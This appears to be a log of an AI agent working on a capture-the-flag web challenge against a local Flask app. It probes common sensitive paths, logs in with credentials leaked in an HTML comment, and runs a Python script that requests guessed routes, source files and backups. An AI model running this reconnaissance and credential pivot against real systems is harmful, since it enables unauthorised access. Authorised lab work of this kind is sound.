--- iter 4 bash --- $ cat <<'EOF' STACK: Werkzeug/3.0.6 on Python/3.8.20, likely Flask app, static asset /static/style.css, no observed proxy, unknown datastore/auth backend. SURFACE: GET / (login form; HTML comment leaks test1:test1), static /static/style.css, POST /login with username/password, common probed paths all 404: /robots.txt /api /admin /debug /healthz /sitemap.xml /.git/HEAD /.env /backup /login.php /search.php /index.php. BUG-HYP: Information disclosure in / HTML comment leaks credentials test1:test1; likely credential pivot into authenticated area via POST /login. WHY: Landing page body contains literal comment "" and login form action=/login method=post. PLAN: - HYPOTHESIS: leaked comment credentials authenticate to /login (evidence: root HTML comment with test1:test1 beside login form). - ATTACK CHAIN: login with leaked creds -> inspect authenticated pages/session -> locate info-disclosed flag/secret/admin route -> flag. - FIRST PROBE: curl -isS -c /tmp/cjar -b /tmp/cjar -X POST -d 'username=test1&password=test1' http://127.0.0.1:9100/login - ABANDON IF: POST /login returns invalid credentials with no session/redirect and same behavior as wrong creds. BREADTH VECTORS RANKED: 1 leaked creds auth pivot; 2 backup/temp/source files; 3 verbose errors/debug; 4 hidden routes/static JS/HTML harvest; 5 SQLi/auth bypass on login; 6 session/cookie weakness; 7 exposed Flask/Werkzeug debug console; 8 credential reuse on nearby services/ports. EOF curl -isS -c /tmp/cjar -b /tmp/cjar -X POST -d 'username=test1&password=test1' http://127.0.0.1:9100/login STACK: Werkzeug/3.0.6 on Python/3.8.20, likely Flask app, static asset /static/style.css, no observed proxy, unknown datastore/auth backend. --- iter 6 bash --- $ cat <<'EOF' STATE (iter 5): - CONFIRMED: /welcome authenticated but only greets test1, no flag/links (iter5 output prior). - REFUTED: direct flag on /welcome. - OPEN: 1 hidden authenticated routes; 2 static/source/backup leakage; 3 role/user pivot; 4 auth/session token weakness; 5 SQLi on login. - NEXT: Harvest static and fuzz common Flask/info-disclosure/auth routes with authenticated cookie. REFLECT (iter 5 / 30): - PROGRESS: 35% (valid creds and session obtained; no flag yet). - DEAD ENDS: /welcome direct leak. - PIVOT: authenticated route/source leakage enumeration (same stack, CTF information_disclosure, no source available). - WHY MISSED: avoid anchoring on credential leak as complete solve; credential is likely stage 1. EOF python3 - <<'PY' import requests, hashlib s=requests.Session(); s.cookies.set('session','') # load cookie from curl jar import http.cookiejar jar=http.cookiejar.MozillaCookieJar('/tmp/cjar'); jar.load(ignore_discard=True, ignore_expires=True) s.cookies.update(jar) base='http://127.0.0.1:9100' paths=['/static/style.css','/logout','/profile','/dashboard','/home','/flag','/flags','/user','/users','/settings','/account','/admin','/admin/','/console','/debug','/source','/src','/app.py','/server.py','/config.py','/backup.zip','/backup.tar.gz','/app.py.bak','/index.html','/login','/welcome/','/welcome?name=x'] for p in paths: try: r=s.get(base+p,timeout=3,allow_redirects=False) print('===== GET',p,'STATUS',r.status_code,'LEN',len(r.content),'SHA',hashlib.sha256(r.content).hexdigest()[:12],'LOC',r.headers.get('Location'),'CTYPE',r.headers.get('Content-Type')) print(r.text) except Exception as e: print('ERR',p,e) PY STATE (iter 5): - CONFIRMED: /welcome authenticated but only greets test1, no flag/links (iter5 output prior). - REFUTED: direct flag on /welcome. - OPEN: 1 hidden authenticated routes; 2 static/source/backup leakage; 3 role/user pivot; 4 auth/session token weakness; 5 SQLi on login. - NEXT: Harvest static and fuzz common Flask/info-disclosure/auth routes with authenticated cookie.
